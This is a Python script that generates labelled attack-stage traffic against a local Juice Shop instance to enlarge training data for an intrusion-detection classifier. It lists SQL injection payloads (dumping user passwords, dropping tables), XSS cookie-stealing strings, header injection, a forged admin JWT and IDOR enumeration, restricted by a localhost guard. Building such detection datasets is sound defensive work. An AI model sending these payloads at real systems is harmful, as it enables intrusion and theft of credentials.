"""
Augment the TRAIN split with fresh, varied traffic driven against local Juice Shop.

WHY
---
The real Burp captures are thin in the attack stages: only ~165 INJECTION and ~160
EXPLOITATION requests land in the training split, drawn from a handful of files, so the
models see too few distinct attack payloads to generalize. Juice Shop is a real server,
so we can generate many more labeled requests with GENUINE responses (a SQL error really
returns 500 with an error body; an unauthorized IDOR really returns 401).

DISCIPLINE
----------
Augmented sessions are labeled "train" ONLY. Validation and test remain pure real
captures, so any measured improvement is genuine generalization from richer training
data, never leakage. Each augmented session is its own "file" so the file-level split
machinery treats it uniformly. Only local Juice Shop is a permitted target.

Output: augmented_corpus.json (a list of {name, stage, requests:[...]}), merged into the
corpus by corpus.load_capture_files(include_augmented=True).
"""

from __future__ import annotations

import json
import random
import time
from typing import Dict, List
from urllib.parse import urlsplit

import requests

BASE = "http://localhost:9000"
ALLOWED_HOST, ALLOWED_PORT = "localhost", 9000
OUTPUT = "augmented_corpus.json"
SEED = 20260907

# Broad, varied request templates per stage -- far more payload variety than the
# captures contain. Each entry: (method, path, params_or_None, headers_or_None).
NORMAL = [
    ("GET", "/", None, None),
    ("GET", "/rest/products/search", {"q": "apple"}, None),
    ("GET", "/rest/products/search", {"q": "banana"}, None),
    ("GET", "/rest/products/search", {"q": "juice"}, None),
    ("GET", "/rest/products/search", {"q": "lemon"}, None),
    ("GET", "/api/Products/1", None, None),
    ("GET", "/api/Products/2", None, None),
    ("GET", "/api/Products/6", None, None),
    ("GET", "/rest/languages", None, None),
    ("GET", "/assets/i18n/en.json", None, None),
    ("GET", "/rest/products/1/reviews", None, None),
]
RECON = [
    ("GET", "/api/Challenges/", {"name": "Score Board"}, None),
    ("GET", "/api/Quantitys/", None, None),
    ("GET", "/rest/user/whoami", {"fields": "email"}, None),
    ("GET", "/rest/user/whoami", None, None),
    ("GET", "/ftp/", None, None),
    ("GET", "/rest/admin/application-version", None, None),
    ("GET", "/api/Feedbacks/", None, None),
    ("GET", "/api/Users/", None, None),
    ("GET", "/rest/products/search", {"q": ""}, None),
    ("GET", "/metrics", None, None),
]
FUZZING_VALUES = ["", "0", "-1", "-999", "999", "999999", "9999999999", "abc", "xyz",
                  "null", "undefined", "true", "false", "'", '"', "%", "*", "../",
                  "1 OR 1", "0x00", "NaN", "-0", "1e10"]
FUZZING_IDS = ["-1", "0", "1", "2", "50", "99", "999", "999999", "abc"]
INJECTION_SQLI = [
    "apple'", "apple''", "apple')", "apple'))", "apple')) OR 1=1--",
    "apple' AND 1=0--", "apple')) UNION SELECT 1,2,3,4--",
    "apple')) UNION SELECT id,email,password,4 FROM Users--",
    "' OR '1'='1", "'; DROP TABLE Users--", "1' AND SLEEP(2)--",
    "' UNION SELECT NULL,version(),NULL,NULL--", "apple' OR 'a'='a",
    "%27%20OR%201=1--", "' AND '1'='1", "1)) OR ((1=1",
]
INJECTION_XSS = [
    "<script>alert(1)</script>", '"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>", "javascript:alert(1)",
    '"><svg/onload=alert(1)>', "apple<script>alert(document.cookie)</script>",
    "<iframe src=javascript:alert(1)>", "'><body onload=alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
]
EXPLOIT_HEADERS = [
    {"X-User-Email": "admin@juice-sh.op'--"},
    {"X-User-Email": "admin@juice-sh.op' OR '1'='1"},
    {"X-User-Email": "administrator@juice-sh.op'#"},
    {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
    {},
]
EXPLOIT_PATHS = [
    "/rest/admin/application-configuration", "/rest/admin/application-version",
    "/api/Users/1", "/api/Users/2", "/api/Users/3", "/rest/basket/1",
    "/rest/basket/2", "/rest/basket/7",
]


def _check_local(url: str):
    u = urlsplit(url)
    if u.hostname != ALLOWED_HOST or u.port not in (None, ALLOWED_PORT):
        raise RuntimeError(f"blocked non-local target: {url}")


def _do(sess, method, path, params, headers):
    url = BASE + path
    _check_local(url)
    hdr = {"User-Agent": "Augmentor/1.0", "Accept": "application/json,text/plain,*/*"}
    if headers:
        hdr.update(headers)
    try:
        r = sess.request(method, url, params=params, headers=hdr, timeout=8)
        _check_local(r.url)
        final = urlsplit(r.url)
        return {
            "method": method, "path": final.path or "/", "query": final.query,
            "body": "", "headers": hdr, "status": r.status_code,
            "response_length": len(r.content), "epoch": time.time(),
        }
    except requests.RequestException:
        return None


def _stage_request(rng, stage):
    if stage == "NORMAL":
        return rng.choice(NORMAL)
    if stage == "RECON":
        # Half the time do systematic ENUMERATION (the real recon signal): walk ids across
        # one template -- product reviews, users, baskets -- rather than a single endpoint.
        if rng.random() < 0.5:
            kind = rng.choice(["reviews", "users", "baskets", "products"])
            i = rng.randint(1, 60)
            if kind == "reviews":
                return ("GET", f"/rest/products/{i}/reviews", None, None)
            if kind == "users":
                return ("GET", f"/api/Users/{i}", None, None)
            if kind == "baskets":
                return ("GET", f"/rest/basket/{i}", None, None)
            return ("GET", f"/api/Products/{i}", None, None)
        return rng.choice(RECON)
    if stage == "FUZZING":
        if rng.random() < 0.6:
            return ("GET", "/rest/products/search", {"q": rng.choice(FUZZING_VALUES)}, None)
        return ("GET", f"/api/Products/{rng.choice(FUZZING_IDS)}", None, None)
    if stage == "INJECTION":
        payload = rng.choice(INJECTION_SQLI + INJECTION_XSS)
        return ("GET", "/rest/products/search", {"q": payload}, None)
    if stage == "EXPLOITATION":
        return ("GET", rng.choice(EXPLOIT_PATHS), None, rng.choice(EXPLOIT_HEADERS))
    raise ValueError(stage)


def main(sessions_per_stage: int = 12, reqs_per_session=(12, 30)):
    # connectivity check
    try:
        requests.get(BASE, timeout=5)
    except Exception:
        raise SystemExit("Juice Shop not reachable on :9000. Start it, then rerun.")

    rng = random.Random(SEED)
    sess = requests.Session()
    out: List[Dict] = []
    stages = ["NORMAL", "RECON", "FUZZING", "INJECTION", "EXPLOITATION"]
    for stage in stages:
        for i in range(sessions_per_stage):
            n = rng.randint(*reqs_per_session)
            reqs = []
            for _ in range(n):
                m, path, params, headers = _stage_request(rng, stage)
                rec = _do(sess, m, path, params, headers)
                if rec:
                    reqs.append(rec)
            if reqs:
                out.append({"name": f"AUG_{stage}_{i:03d}", "stage": stage, "requests": reqs})
        print(f"  {stage}: {sum(1 for o in out if o['stage']==stage)} augmented sessions")
    sess.close()
    json.dump(out, open(OUTPUT, "w"))
    total = sum(len(o["requests"]) for o in out)
    print(f"[+] wrote {OUTPUT}: {len(out)} sessions, {total} real-response requests (train-only)")


if __name__ == "__main__":
    main()
